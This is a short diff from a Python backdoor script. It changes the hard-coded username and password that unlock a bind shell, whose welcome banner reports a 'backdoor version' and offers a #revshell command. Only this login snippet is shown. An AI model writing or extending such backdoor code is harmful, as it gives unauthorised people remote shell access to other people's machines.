@@ -99,7 +99,7 @@ def handle_client(client_sock):
     client_sock.send(f'[{green}Password{off}]: '.encode())
     password = client_sock.recv(1024).decode().strip()
     #Change username and Password
-    if username == 'froot' and password == 'detrew':
+    if username == 'Machine' and password == 'sorvete':
         client_sock.send(b'\033c')
         client_sock.send(f'{banner_reaper}\n'.encode())
         client_sock.send(f'{green}[*]{off} Welcome\n{green}[+]{off} python version: {python_version}\n{green}[+]{off} backdoor version: {backdoor_version}\n{green}[+]{off} Use #help to see the commands\n{red}[+]{yellow} This is A bind Shell to Have a Reverse Shell Use the command {green}#revshell\n{off}'.encode())
